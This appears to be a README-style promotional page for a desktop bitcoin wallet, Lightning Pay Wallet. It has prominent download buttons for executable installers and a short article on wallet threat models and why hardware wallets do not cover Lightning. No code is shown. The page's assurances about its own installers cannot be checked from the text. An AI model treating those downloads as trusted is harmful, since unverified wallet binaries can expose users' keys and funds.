<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# The safest bitcoin wallets, and whether hardware fits Lightning
What "safest" means, where a hardware wallet helps, and where it does not reach.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

"Safest wallet" is not a product category, it is a threat model. The right question is what you are
protecting against, because the answer changes the recommendation.

## The four threats

**Device theft or malware.** A hardware wallet wins: the key never touches the computer.

**Your own mistake.** A wallet with a tested backup and a clear restore path wins, and that is usually
software, because a hardware wallet's recovery is more involved.

**Operator failure.** A non-custodial wallet wins, hardware or software, because there is no operator.

**Loss of the backup.** Every wallet loses equally. No device protects against a phrase that was never
written down.

## Where hardware helps

A hardware wallet keeps the private key in a dedicated device and signs transactions there. Malware on
the computer can ask for a signature but cannot exfiltrate the key. For a long-term on-chain balance,
that is a real improvement.

The cost is friction: every spend needs the device, and the device needs its own backup discipline,
which is the same phrase problem in a different box.

## Where hardware does not reach

Lightning. Channels are hot by design: the node that holds them must be online and able to sign
routinely, which is the opposite of what a hardware wallet is for. Some setups pair a hardware wallet
with a separate node, and the Lightning balance still sits on the node rather than behind the device.

So a hardware wallet protects your savings, not your spending balance. That is why the common
arrangement is a hardware wallet for the on-chain reserve and a desktop wallet for the Lightning
balance.

## What this wallet supports

Lightning Pay Wallet is a desktop application with its keys on your machine. Hardware wallet support
is not part of the current release, so treat any page promising Ledger integration today as describing
something else or something planned.

For a small working balance, a desktop wallet with a written phrase is a reasonable posture. For an
amount you would not want to lose, a hardware wallet for the on-chain part is the standard answer.

## The part nobody sells

Backup discipline beats hardware. A hardware wallet with a phrase in a drawer and no test restore is
less safe than a software wallet whose restore you have actually performed once.

## Questions people ask

### Can I connect a Ledger to Lightning Pay?

Not in the current release. Card and hardware integrations belong to the roadmap, not the build.

### Is a hardware wallet worth it?

For a long-term on-chain balance, usually. For a spending balance in Lightning, it does not apply.

### What is the single best safety step?

Test a restore before you need one. It catches every mistake that matters.
